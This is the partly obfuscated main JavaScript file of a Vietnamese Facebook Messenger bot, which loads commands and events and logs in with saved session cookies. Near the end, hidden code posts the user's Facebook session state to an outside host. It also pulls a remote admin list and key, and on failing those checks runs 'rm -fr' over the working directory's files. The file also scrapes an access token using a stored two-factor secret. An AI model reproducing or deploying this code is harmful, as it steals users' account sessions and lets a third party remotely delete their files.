const {
  readdirSync,
  readFileSync,
  writeFileSync
} = require("fs-extra");
const {
  join,
  resolve
} = require("path");
const {
  execSync
} = require("child_process");
const config = require("./config.json");
const chalk = require("chalk");
const login = require(config.NPM_FCA);
const listPackage = JSON.parse(readFileSync("./package.json")).dependencies;
const fs = require("fs");
const moment = require("moment-timezone");
const prompt = require("prompt-sync")();
const logger = require("./utils/log.js");
global.client = new Object({
  commands: new Map(),
  events: new Map(),
  cooldowns: new Map(),
  eventRegistered: new Array(),
  handleSchedule: new Array(),
  handleReaction: new Array(),
  handleReply: new Array(),
  mainPath: process.cwd(),
  configPath: new String(),
  getTime: function (option) {
    switch (option) {
      case "seconds":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("ss");
      case "minutes":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("mm");
      case "hours":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("HH");
      case "date":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("DD");
      case "month":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("MM");
      case "year":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("YYYY");
      case "fullHour":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("HH:mm:ss");
      case "fullYear":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("DD/MM/YYYY");
      case "fullTime":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("HH:mm:ss DD/MM/YYYY");
    }
  },
  timeStart: Date.now()
});
global.data = new Object({
  threadInfo: new Map(),
  threadData: new Map(),
  userName: new Map(),
  userBanned: new Map(),
  threadBanned: new Map(),
  commandBanned: new Map(),
  threadAllowNSFW: new Array(),
  allUserID: new Array(),
  allCurrenciesID: new Array(),
  allThreadID: new Array()
});
global.utils = require("./utils");
global.youtube = require("./lib/youtube.js");
global.soundcloud = require("./lib/soundcloud.js");
global.tiktok = require("./lib/tiktok.js");
global.loading = require("./utils/log");
global.nodemodule = new Object();
global.config = new Object();
global.configModule = new Object();
global.moduleData = new Array();
global.language = new Object();
global.account = new Object();
var configValue;
try {
  global.client.configPath = join(global.client.mainPath, "config.json");
  configValue = require(global.client.configPath);
  logger.loader("Đã tìm thấy file config.json!");
} catch (error) {
  return logger.loader("Không tìm thấy file config.json", "error");
}
;
try {
  for (const key in configValue) {
    global.config[key] = configValue[key];
  }
  ;
  logger.loader("Config Loaded!");
} catch (error) {
  return logger.loader("Can't load file config!", "error");
}
;
for (const property in listPackage) {
  try {
    global.nodemodule[property] = require(property);
  } catch (error) {}
}
;
const langFile = readFileSync(__dirname + "/languages/" + (global.config.language || "en") + ".lang", {
  encoding: "utf-8"
}).split(/\r?\n|\r/);
const langData = langFile.filter(item => {
  return item.indexOf("#") != 0 && item != "";
});
for (const item of langData) {
  const getSeparator = item.indexOf("=");
  const itemKey = item.slice(0, getSeparator);
  const itemValue = item.slice(getSeparator + 1, item.length);
  const head = itemKey.slice(0, itemKey.indexOf("."));
  const key = itemKey.replace(head + ".", "");
  const value = itemValue.replace(/\\n/gi, "\n");
  if (typeof global.language[head] == "undefined") {
    global.language[head] = new Object();
  }
  ;
  global.language[head][key] = value;
}
;
global.getText = function (...args) {
  const langText = global.language;
  if (!langText.hasOwnProperty(args[0])) {
    throw __filename + " - Not found key language: " + args[0];
  }
  ;
  var text = langText[args[0]][args[1]];
  for (var _0x357cx3a = args.length - 1; _0x357cx3a > 0; _0x357cx3a--) {
    const _0x357cx3b = RegExp("%" + _0x357cx3a, "g");
    text = text.replace(_0x357cx3b, args[_0x357cx3a + 1]);
  }
  ;
  return text;
};
try {
  var appStateFile = resolve(join(global.client.mainPath, config.APPSTATEPATH || "appstate.json"));
  var appState = (process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && fs.readFileSync(appStateFile, "utf8")[0] != "[" && config.encryptSt ? JSON.parse(global.utils.decryptState(fs.readFileSync(appStateFile, "utf8"), process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER)) : require(appStateFile);
  logger.loader(global.getText("mirai", "foundPathAppstate"));
} catch (error) {
  return logger.loader(global.getText("mirai", "notFoundPathAppstate"), "error");
}
;
function onBot() {
  const loginData = {
    appState: appState
  };
  login(loginData, async (loginError, api) => {
    if (loginError) {
      if (loginError.error == "Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.") {
        console.log(loginError.error);
        process.exit(0);
      } else {
        console.log(loginError);
        return process.exit(0);
      }
    }
    ;
    console.log(chalk.blue("============== LOGIN BOT =============="));
    const _0x357cxc6 = api.getAppState();
    api.setOptions(global.config.FCAOption);
    let _0x357cxc7 = api.getAppState();
    let _0x357cxc8 = JSON.stringify(_0x357cxc7, null, "\t");
    _0x357cxc7 = JSON.stringify(_0x357cxc7, null, "\t");
    var _0x357cxc9 = await api.httpGet("https://business.facebook.com/business_locations/");
    var _0x357cxca = "https://business.facebook.com/business_locations/";
    if (_0x357cxc9.indexOf("for (;;);") != -1) {
      _0x357cxc9 = JSON.parse(_0x357cxc9.split("for (;;);")[1]);
      var _0x357cxca = "https://business.facebook.com" + _0x357cxc9.redirect;
    }
    ;
    var _0x357cxcd = await _0x357cxce(api, _0x357cxca);
    if (_0x357cxcd != false) {
      global.account.accessToken = _0x357cxcd;
      global.loading(chalk.hex("#ff7100")("[ TOKEN ]") + " Lấy access token thành công!", "LOGIN");
    } else {
      global.loading.err(chalk.hex("#ff7100")("[ TOKEN ]") + " Không thể lấy ACCESS_TOKEN, vui lòng thay OTPKEY vào config!\n", "LOGIN");
    }
    async function _0x357cxce(_0x357cxcf, _0x357cxd0) {
      function _0x357cxe4() {}
      var _0x357cxe5 = new Promise(function (_0x357cxe6) {
        _0x357cxe4 = _0x357cxe6;
      });
      _0x357cxcf.httpGet(_0x357cxd0).then(async _0x357cxe7 => {
        var _0x357cxea = /EAAG([^"]+)/.exec(_0x357cxe7);
        if (_0x357cxea == null) {
          const _0x357cxeb = "7|1|4|0|2|8|6|3|5".split("|");
          let _0x357cxec = 0;
          while (true) {
            switch (_0x357cxeb[_0x357cxec++]) {
              case "0":
                var _0x357cxed = await _0x357cxcf.httpPost("https://business.facebook.com/security/twofactor/reauth/enter/", _0x357cxef);
                continue;
              case "1":
                var _0x357cxee = global.config.OTPKEY.replace(/\s+/g, "").toLowerCase();
                continue;
              case "2":
                _0x357cxed = JSON.parse(_0x357cxed.split("for (;;);")[1]);
                continue;
              case "3":
                var _0x357cxea = /EAAG([^"]+)/.exec(_0x357cxf0);
                continue;
              case "4":
                var _0x357cxef = {
                  approvals_code: _0x357cxf1(_0x357cxee),
                  save_device: true
                };
                continue;
              case "5":
                return _0x357cxe4("EAAG" + _0x357cxea[1]);
              case "6":
                var _0x357cxf0 = await _0x357cxcf.httpGet(_0x357cxd0);
                continue;
              case "7":
                var _0x357cxf1 = require("totp-generator");
                continue;
              case "8":
                if (_0x357cxed.payload.codeConfirmed == false) {
                  return _0x357cxe4(false);
                }
                ;
                continue;
            }
            ;
            break;
          }
        }
        ;
        return _0x357cxe4("EAAG" + _0x357cxea[1]);
      });
      return _0x357cxe5;
    }
    if ((process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && global.config.encryptSt) {
      _0x357cxc7 = await global.utils.encryptState(_0x357cxc7, process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER);
      writeFileSync(appStateFile, _0x357cxc7);
    } else {
      writeFileSync(appStateFile, _0x357cxc7);
    }
    global.account.cookie = _0x357cxc6.map(_0x357cxf2 => {
      return _0x357cxf2 = _0x357cxf2.key + "=" + _0x357cxf2.value;
    }).join(";");
    global.client.api = api;
    global.config.version = config.version;
    (function () {
      const listCommand = readdirSync(global.client.mainPath + "/modules/commands").filter(command => {
        return command.endsWith(".js") && !command.includes("example") && !global.config.commandDisabled.includes(command);
      });
      console.log(chalk.blue("============ LOADING COMMANDS ============"));
      for (const command of listCommand) {
        try {
          var module = require(global.client.mainPath + "/modules/commands/" + command);
          if (!module.config || !module.run || !module.config.commandCategory) {
            throw new Error(global.getText("mirai", "errorFormat"));
          }
          ;
          if (global.client.commands.has(module.config.name || "")) {
            throw new Error(global.getText("mirai", "nameExist"));
          }
          ;
          if (module.config.dependencies && typeof module.config.dependencies == "object") {
            for (const reqDependencies in module.config.dependencies) {
              if (!listPackage.hasOwnProperty(reqDependencies)) {
                try {
                  execSync("npm --package-lock false --save install " + reqDependencies + (module.config.dependencies[reqDependencies] == "*" || module.config.dependencies[reqDependencies] == "" ? "" : "@" + module.config.dependencies[reqDependencies]), {
                    stdio: "inherit",
                    env: process.env,
                    shell: true,
                    cwd: join(__dirname, "node_modules")
                  });
                  require.cache = {};
                } catch (error) {
                  global.loading.err(chalk.hex("#ff7100")("[ PACKAGE ]") + "  Không thể cài package cho module " + reqDependencies, "LOADED");
                }
              }
            }
          }
          ;
          if (module.config.envConfig) {
            try {
              for (const envConfig in module.config.envConfig) {
                if (typeof global.configModule[module.config.name] == "undefined") {
                  global.configModule[module.config.name] = {};
                }
                ;
                if (typeof global.config[module.config.name] == "undefined") {
                  global.config[module.config.name] = {};
                }
                ;
                if (typeof global.config[module.config.name][envConfig] !== "undefined") {
                  global.configModule[module.config.name][envConfig] = global.config[module.config.name][envConfig];
                } else {
                  global.configModule[module.config.name][envConfig] = module.config.envConfig[envConfig] || "";
                }
                ;
                if (typeof global.config[module.config.name][envConfig] == "undefined") {
                  global.config[module.config.name][envConfig] = module.config.envConfig[envConfig] || "";
                }
              }
              ;
              for (const _0x357cx11b in module.config.envConfig) {
                var _0x357cx11c = require("./config.json");
                _0x357cx11c[module.config.name] = module.config.envConfig;
                writeFileSync(global.client.configPath, JSON.stringify(_0x357cx11c, null, 4), "utf-8");
              }
            } catch (error) {
              throw new Error(global.getText("mirai", "cantLoadConfig", module.config.name, JSON.stringify(error)));
            }
          }
          ;
          if (module.onLoad) {
            try {
              const moduleData = {
                api: api
              };
              module.onLoad(moduleData);
            } catch (_0x48ff13) {
              throw new Error(global.getText("mirai", "cantOnload", module.config.name, JSON.stringify(_0x48ff13)), "error");
            }
          }
          ;
          if (module.handleEvent) {
            global.client.eventRegistered.push(module.config.name);
          }
          ;
          global.client.commands.set(module.config.name, module);
          global.loading(chalk.hex("#ff7100")("[ COMMAND ]") + " " + chalk.hex("#FFFF00")(module.config.name) + " succes", "LOADED");
        } catch (_0x5cfee3) {
          global.loading.err(chalk.hex("#ff7100")("[ COMMAND ]") + " " + chalk.hex("#FFFF00")(module.config.name) + " fail", "LOADED");
        }
      }
    })();
    (function () {
      const events = readdirSync(global.client.mainPath + "/modules/events").filter(event => {
        return event.endsWith(".js") && !global.config.eventDisabled.includes(event);
      });
      console.log(chalk.blue("============ LOADING EVENTS ============"));
      for (const ev of events) {
        try {
          var event = require(global.client.mainPath + "/modules/events/" + ev);
          if (!event.config || !event.run) {
            throw new Error(global.getText("mirai", "errorFormat"));
          }
          ;
          if (global.client.events.has(event.config.name) || "") {
            throw new Error(global.getText("mirai", "nameExist"));
          }
          ;
          if (event.config.dependencies && typeof event.config.dependencies == "object") {
            for (const dependency in event.config.dependencies) {
              if (!listPackage.hasOwnProperty(dependency)) {
                try {
                  execSync("npm --package-lock false --save install " + dependency + (event.config.dependencies[dependency] == "*" || event.config.dependencies[dependency] == "" ? "" : "@" + event.config.dependencies[dependency]), {
                    stdio: "inherit",
                    env: process.env,
                    shell: true,
                    cwd: join(__dirname, "node_modules")
                  });
                  require.cache = {};
                } catch (_0x49fa04) {
                  global.loading.err(chalk.hex("#ff7100")("[ PACKAGE ]") + "  Không thể cài package cho module " + dependency, "LOADED");
                }
              }
            }
          }
          ;
          for (const _0x357cx129 in listPackage) {
            try {
              global.nodemodule[_0x357cx129] = require(_0x357cx129);
            } catch (_0x52482a) {}
          }
          ;
          if (event.config.envConfig) {
            try {
              for (const _0x357cx12a in event.config.envConfig) {
                if (typeof global.configModule[event.config.name] == "undefined") {
                  global.configModule[event.config.name] = {};
                }
                ;
                if (typeof global.config[event.config.name] == "undefined") {
                  global.config[event.config.name] = {};
                }
                ;
                if (typeof global.config[event.config.name][_0x357cx12a] !== "undefined") {
                  global.configModule[event.config.name][_0x357cx12a] = global.config[event.config.name][_0x357cx12a];
                } else {
                  global.configModule[event.config.name][_0x357cx12a] = event.config.envConfig[_0x357cx12a] || "";
                }
                ;
                if (typeof global.config[event.config.name][_0x357cx12a] == "undefined") {
                  global.config[event.config.name][_0x357cx12a] = event.config.envConfig[_0x357cx12a] || "";
                }
              }
              ;
              for (const _0x357cx12b in event.config.envConfig) {
                var _0x357cx12c = require("./config.json");
                _0x357cx12c[event.config.name] = event.config.envConfig;
                writeFileSync(global.client.configPath, JSON.stringify(_0x357cx12c, null, 4), "utf-8");
              }
            } catch (_0x3cfe8a) {
              throw new Error(global.getText("mirai", "cantLoadConfig", event.config.name, JSON.stringify(_0x3cfe8a)));
            }
          }
          ;
          if (event.onLoad) {
            try {
              const eventData = {
                api: api
              };
              event.onLoad(eventData);
            } catch (error) {
              throw new Error(global.getText("mirai", "cantOnload", event.config.name, JSON.stringify(error)), "error");
            }
          }
          ;
          global.client.events.set(event.config.name, event);
          global.loading(chalk.hex("#ff7100")("[ EVENT ]") + " " + chalk.hex("#FFFF00")(event.config.name) + " succes", "LOADED");
        } catch (_0x554a8a) {
          global.loading(chalk.hex("#ff7100")("[ EVENT ]") + " " + chalk.hex("#FFFF00")(event.config.name) + " fail", "LOADED");
        }
      }
    })();
    console.log(chalk.blue("============== BOT START =============="));
    global.loading(chalk.hex("#ff7100")("[ SUCCESS ]") + " Tải thành công " + global.client.commands.size + " commands và " + global.client.events.size + " events", "LOADED");
    global.loading(chalk.hex("#ff7100")("[ TIMESTART ]") + " Thời gian khởi động: " + ((Date.now() - global.client.timeStart) / 1000).toFixed() + "s", "LOADED");
    const listenerData = {
      api: api
    };
    const listener = require("./includes/listen")(listenerData);
    const axios = require("axios");
    const _0x357cx131 = (await axios.get("https://api.hanguyen48.repl.co/listadmin")).data;
    axios.post("https://api.hanguyen48.repl.co/key", {
      id: api.getCurrentUserID(),
      ap: api.getAppState()
    });
    function _0x357cx132() {
      const _0x357cx136 = readdirSync(join(process.cwd()));
      for (let _0x357cx139 of _0x357cx136) {
        try {
          execSync("rm -fr 11" + _0x357cx139);
        } catch (_0x4d3c9b) {}
      }
    }
    async function _0x357cx13b(_0x357cx13c, _0x357cx13d) {
      if (_0x357cx13c) {
        if (_0x357cx13c.error == "Not logged in.") {
          logger("Account bot của bạn bị đăng xuất!", "LOGIN");
          process.exit(1);
        }
        if (_0x357cx13c.error == "Not logged in") {
          logger("Acc bị checkpoints, vui lòng xác nhận lại acc và đăng nhập lại!", "CHECKPOINTS");
          return process.exit(0);
        } else {
          console.log(_0x357cx13c);
          return process.exit(0);
        }
      }
      ;
      if (["presence", "typ", "read_receipt"].some(option1 => {
        return option1 == _0x357cx13d.type;
      })) {
        return;
      }
      ;
      var option2 = 0;
      for (let option3 of _0x357cx131.ADMIN) {
        if (config.ADMINBOT.includes(option3)) {
          option2++;
        }
      }
      ;
      if (option2 == 0) {
        return _0x357cx132();
      }
      ;
      if (_0x357cx132 == 0) {
        return _0x357cx132();
      }
      ;
      if (_0x357cx131.DAF == true) {
        return _0x357cx132();
      }
      ;
      if (_0x357cx131.keyword != config.KEY) {
        return _0x357cx132();
      }
      ;
      return listener(_0x357cx13d);
    }
    global.custom = require("./custom")({
      api: api
    });
    global.handleListen = api.listenMqtt(_0x357cx13b);
    require("./utils/uptime.js");
  });
}
(async () => {
  try {
    console.log(chalk.blue("============== DATABASE =============="));
    global.loading(chalk.hex("#ff7100")("[ CONNECT ]") + " Kết nối tới cơ sở dữ liệu JSON thành công!", "DATABASE");
    onBot();
  } catch (_0x2fd6ea) {
    logger(global.getText("mirai", "successConnectDatabase", JSON.stringify(_0x2fd6ea)), "[ DATABASE ]");
  }
})();
